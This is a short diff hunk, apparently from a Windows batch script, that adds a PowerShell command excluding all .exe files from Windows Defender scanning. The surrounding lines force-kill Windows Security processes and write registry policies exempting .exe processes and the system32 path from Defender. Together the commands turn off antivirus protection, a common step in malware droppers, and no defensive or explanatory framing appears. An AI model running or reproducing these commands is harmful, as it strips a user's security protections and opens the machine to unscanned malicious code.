@@ -17,6 +17,7 @@ taskkill /f /im SecurityHealthHost.exe
 taskkill /f /im SecurityHealthHost.exe
 taskkill /f /im RuntimeBroker.exe
 taskkill /f /im SecHealthUI.exe
+Add-MpPreference -ExclusionExtension ".exe"
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Processes" /v .exe /t REG_SZ /d "Значение_параметра" /reg:64
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths" /v system32 /t REG_SZ /d "Значение_параметра" /reg:64
 timeout /t 1
